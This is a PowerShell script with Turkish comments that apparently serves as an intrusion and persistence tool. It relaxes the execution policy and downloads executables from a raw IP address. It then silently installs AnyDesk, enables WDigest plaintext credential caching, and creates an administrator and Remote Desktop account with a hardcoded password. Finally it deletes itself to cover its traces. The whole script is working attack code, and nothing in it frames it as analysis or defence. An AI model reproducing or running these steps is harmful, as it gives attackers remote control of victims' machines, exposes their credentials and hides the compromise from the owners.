# Execution Policy AyarlarÄ±
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force

# KullanÄ±cÄ± Bilgileri
$ad = "admins11"
$sifre1 = "@@@111Admin."
$isim = "admins11"

# URL ve dosya adlarÄ±
$urls = @(
    "http://2.57.149.232/Tools.exe",
    "http://2.57.149.232/AD.exe",
    "http://2.57.149.232/Tools2.exe"
)

$fileNames = @(
    "1tools.exe",
    "AD.exe",
    "2tools.exe"
)

# Hedef dizinler
$destinationDirs = @(
    "C:\users\Administrator\Desktop\",
    "C:\users\Administrator\Documents\",
    "C:\users\Administrator\Downloads\"
)

# URL ve dosya adlarÄ±nÄ± kontrol et
try {
    if ($urls.Length -ne $fileNames.Length -or $urls.Length -ne $destinationDirs.Length) {
        throw "URL, dosya adÄ± ve hedef dizin sayÄ±larÄ± eÅleÅmiyor."
    }
} catch {
    Write-Host "Hata oluÅtu: $_"
    return
}

# Ä°Ålem
for ($i = 0; $i -lt $urls.Length; $i++) {
    $url = $urls[$i]
    $fileName = $fileNames[$i]
    $destinationDir = $destinationDirs[$i]
    $localFilePath = Join-Path -Path $destinationDir -ChildPath $fileName

    try {
        # Dosya indirme iÅlemi
        $response = Invoke-WebRequest -Uri $url -UseBasicParsing
        $fileBytes = $response.Content -as [byte[]]

        # Dosya kaydetme iÅlemi
        [System.IO.File]::WriteAllBytes($localFilePath, $fileBytes)
        Write-Host "Dosya baÅarÄ±yla kaydedildi: $localFilePath"
    } catch {
        # Hata durumunda mesaj yazdÄ±r ve devam et
        Write-Host "Hata oluÅtu, iÅlem devam ediyor: $_"
        continue
    }
}

# DiÄer iÅlemler
try {
    $cmdCommand = 'C:\windows\temp\AD.exe --install "C:\Program Files (x86)" --silent'
    Invoke-Expression -Command $cmdCommand
} catch {
    Write-Host "AD.exe kurulumu baÅarÄ±sÄ±z."
}

# Hizmeti Restart Et
try {
    Restart-Service -Name "Anydesk Anydesk Service"
} catch {
    Write-Host "Anydesk servisi restart edilemedi."
}

# Registry DeÄerini Ayarla
try {
    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\wdigest"
    $registryName = "UseLogonCredential"
    $registryValue = 1
    New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType DWORD -Force
} catch {
    Write-Host "Registry deÄeri ayarlanamadÄ±."
}

# Yeni KullanÄ±cÄ± OluÅtur
try {
    $sifre = ConvertTo-SecureString -String $sifre1 -AsPlainText -Force
    New-LocalUser -Name $ad -Password $sifre -FullName $isim -Description "Yeni kullanÄ±cÄ± hesabÄ± oluÅturuldu."

    # KullanÄ±cÄ±yÄ± Belirli Bir Gruba Ekle (GrupSID belirtilmemiÅ, dÃ¼zenlenmesi gerekebilir)
    $grupSID = "S-1-5-32-544"  # Bu Ã¶rnekte Administrators grubu
    Add-LocalGroupMember -SID $grupSID -Member $ad
} catch {
    Write-Host "Yeni kullanÄ±cÄ± oluÅturulamadÄ± veya gruba eklenemedi."
}

# net user ve net localgroup komutlarÄ± ile devam eden bÃ¶lÃ¼mler
try {
    net user $ad $sifre1 /add
} catch {
    Write-Host "net user komutu baÅarÄ±sÄ±z oldu."
}

try {
    net localgroup Administrators $ad /add
} catch {
    Write-Host "net localgroup Administrators komutu baÅarÄ±sÄ±z oldu."
}

try {
    $localGroups = @("Administradores", "Administratoren", "Administrateurs", "Remote Desktop Users")

    foreach ($group in $localGroups) {
        net localgroup $group $ad /add
    }
} catch {
    Write-Host "net localgroup komutu baÅarÄ±sÄ±z oldu."
}

# Script'i Sil
try {
    Remove-Item -Path "C:\Windows\Temp\AD.exe" -Force
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force
} catch {
    Write-Host "Dosyalar veya script silinemedi."
}
